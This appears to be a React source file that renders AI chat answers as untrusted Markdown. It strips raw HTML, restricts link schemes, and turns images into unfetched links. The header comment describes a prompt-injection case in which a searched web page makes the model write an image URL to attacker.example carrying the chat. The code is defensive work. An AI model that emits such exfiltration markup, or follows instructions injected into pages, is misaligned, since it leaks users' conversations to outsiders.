/**
 * An answer, as Markdown, treated as untrusted (workbench-v1.md W5).
 *
 * - No raw HTML: `react-markdown` without `rehype-raw` renders HTML in an
 *   answer as the text it is. Four tags with no attributes (`<br>`, `<sub>`,
 *   `<sup>`, `<kbd>`) are read as the Markdown they stand for
 *   (lib/markdownPlugins.ts); every other tag is dropped.
 * - **An image an answer names is shown as a link, never fetched.** A page
 *   the model read in a search can tell it to write
 *   `![](https://attacker.example/?q=<the chat>)`, and rendering that image
 *   would send the chat away. The page's Content Security Policy refuses
 *   the fetch as well; this is the first lock on the same door.
 * - Only http, https and mailto links are links, opened in a new tab with
 *   no opener and no referrer. A footnote's reference and its way back are
 *   the one exception: each moves focus to its partner inside the same answer
 *   and changes nothing else (not the address, not the page's hash).
 * - Formulas (`$x$`, `\(x\)`, `$$x$$`, `\[x\]`: lib/markdownMath.ts) are laid
 *   out in a worker and drawn as elements (MathFormula.tsx); one that cannot
 *   be shown is its source.
 * - A mermaid code block is drawn in a worker and shown as a picture
 *   (MermaidDiagram.tsx); one that cannot be drawn is its source.
 *
 * How it reads is the stylesheet's (`.answer`, styles.css); the parts that
 * need an element of their own are made here: the code block (language and
 * Copy joined to the code), the table's scrolling box, the lead-in, the task
 * box (workbench-reading.md 6.3).
 */

import {
  Children,
  isValidElement,
  memo,
  useId,
  useMemo,
  type MouseEvent,
  type ReactNode,
} from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";
import { remarkMath } from "../lib/markdownMath";
import {
  rehypeFootnoteScope,
  rehypeOpenFences,
  remarkAlerts,
  remarkAllowedHtml,
} from "../lib/markdownPlugins";
import { Block } from "./Block";
import { MathFormula } from "./MathFormula";
import { MermaidDiagram } from "./MermaidDiagram";

const SAFE = /^(https?:|mailto:)/i;

export function safeHref(href: string | undefined | null): string | null {
  if (!href) return null;
  const trimmed = href.trim();
  return SAFE.test(trimmed) ? trimmed : null;
}

type CodeProps = { className?: string; children?: ReactNode; "data-fence"?: string };

/** A display formula that cannot be shown: its source, as a block of code. */
function formulaSource(tex: string, reason: string): ReactNode {
  return <Block language="math" source={tex} open={false} note={`Formula not shown: ${reason}`} />;
}

function CodeBlock({ children }: { children: ReactNode }) {
  const code = Children.toArray(children)[0];
  if (!isValidElement<CodeProps>(code)) {
    return <Block language={null} source={textOf(children)} open={false} />;
  }
  // The language as the fence wrote it ("bash", "py"); none when it wrote none.
  const language = /language-([\w#+.-]+)/.exec(code.props.className ?? "")?.[1] ?? null;
  const source = textOf(code.props.children);
  const open = code.props["data-fence"] === "open";
  // A block formula (`$$`, `\[`, or a fence whose language is `math`), once
  // it has closed.
  if (language === "math" && !open) {
    return (
      <div className="math-block">
        <MathFormula tex={source.trim()} display failed={formulaSource} />
      </div>
    );
  }
  // A diagram, once its fence has closed; until then it is the code it is.
  if (language === "mermaid" && !open) return <MermaidDiagram source={source} />;
  return <Block language={language} source={source} open={open} />;
}

function textOf(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (typeof node === "object" && "props" in node) {
    return textOf((node as { props: { children?: ReactNode } }).props.children);
  }
  return "";
}

/**
 * A footnote's reference or its way back: focus moves to its partner, found
 * by id inside the same answer and nowhere else, and the address is left
 * alone (a hash would be the app's route).
 */
function toPartner(event: MouseEvent<HTMLAnchorElement>): void {
  event.preventDefault();
  const link = event.currentTarget;
  const region = link.closest<HTMLElement>("[data-md-scope]");
  const id = link.getAttribute("href")?.slice(1) ?? "";
  const scope = region?.dataset.mdScope;
  if (!region || !scope || !id.startsWith(scope)) return;
  const target = [...region.querySelectorAll<HTMLElement>("[id]")].find((el) => el.id === id);
  target?.focus();
}

type FootnoteProps = {
  "data-footnote-ref"?: unknown;
  "data-footnote-backref"?: unknown;
};

const components: Components = {
  img({ src, alt }) {
    const href = safeHref(typeof src === "string" ? src : null);
    const label = alt ? `Image: ${alt}` : "Image";
    if (!href) return <span className="text-muted">[{label}]</span>;
    return (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        title="Not shown here: open it yourself if you trust it"
      >
        [{label}]
      </a>
    );
  },
  a({ href, children, id, className, ...rest }) {
    const footnote = rest as FootnoteProps;
    const isRef = footnote["data-footnote-ref"] != null;
    const isBack = footnote["data-footnote-backref"] != null;
    // Only the parser makes these (raw HTML is dropped, and a model's own
    // `[x](#id)` has neither), and only a link inside the page.
    if ((isRef || isBack) && href?.startsWith("#")) {
      return (
        <a
          href={href}
          id={id}
          className={className}
          aria-describedby={rest["aria-describedby"]}
          aria-label={rest["aria-label"]}
          data-footnote-ref={isRef ? "" : undefined}
          data-footnote-backref={isBack ? "" : undefined}
          onClick={toPartner}
        >
          {children}
        </a>
      );
    }
    const safe = safeHref(href);
    if (!safe) return <span>{children}</span>;
    return (
      <a href={safe} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  pre({ children }) {
    return <CodeBlock>{children}</CodeBlock>;
  },
  code({ className, children }) {
    const kind = /\bmath-(inline|display)\b/.exec(className ?? "")?.[1];
    if (kind) return <MathFormula tex={textOf(children)} display={kind === "display"} />;
    return <code className={className}>{children}</code>;
  },
  // A footnote is where its reference sends focus.
  li({ id, className, children }) {
    return (
      <li id={id} className={className} tabIndex={id ? -1 : undefined}>
        {children}
      </li>
    );
  },
  // A wide table scrolls inside its own box, not the answer; the wrapper (and
  // not `display: block` on the table) keeps it a table to a screen reader.
  table({ children }) {
    return (
      <div className="table-wrap">
        <table>{children}</table>
      </div>
    );
  },
  // "Why:", "Risks:", "Note:": a short bold label ending in a colon is a
  // label, and takes the heading's colour.
  strong({ children }) {
    const label = textOf(children).trim();
    const leadIn = label.length > 0 && label.length <= 48 && /[:：]$/.test(label);
    return <strong className={leadIn ? "lead-in" : undefined}>{children}</strong>;
  },
  // The browser's disabled checkbox is 13 px, 1.5 to 1.6:1 against the page
  // and has no name. A drawn box says the same thing and the words are for a
  // screen reader.
  input({ checked, type }) {
    if (type !== "checkbox") return null;
    return (
      <>
        <span className="task-box" aria-hidden="true" data-checked={checked ? "true" : "false"} />
        <span className="sr-only">{checked ? "Done: " : "Not done: "}</span>
      </>
    );
  },
};

// At module scope: react-markdown builds its processor on every render, and a
// streamed answer renders on every chunk.
const remarkPlugins = [remarkGfm, remarkMath, remarkAllowedHtml, remarkAlerts, remarkBreaks];

/**
 * `quiet` is for a draft the model wrote before a search or a tool call: it
 * sits in a muted box at the chrome's size, and its text keeps that size.
 *
 * Memoised, because its props are a string and a flag: a streamed answer
 * changes the page on every token, and only the answer being written should
 * be parsed again, not every finished one above it in the thread.
 *
 * Each one has its own prefix for the ids it makes, so two answers with a
 * `[^1]`, or a draft and its answer, each keep their own footnotes.
 */
export const Markdown = memo(function Markdown({
  text,
  quiet = false,
}: {
  text: string;
  quiet?: boolean;
}) {
  const scope = `md${useId().replace(/[^\w-]/g, "")}-`;
  const { rehypePlugins, remarkRehypeOptions } = useMemo(
    () => ({
      rehypePlugins: [rehypeOpenFences, rehypeFootnoteScope(scope)],
      remarkRehypeOptions: { clobberPrefix: scope },
    }),
    [scope],
  );
  return (
    <div className={quiet ? "answer answer-quiet" : "answer"} data-md-scope={scope}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
        remarkRehypeOptions={remarkRehypeOptions}
        components={components}
        skipHtml
      >
        {text}
      </ReactMarkdown>
    </div>
  );
});
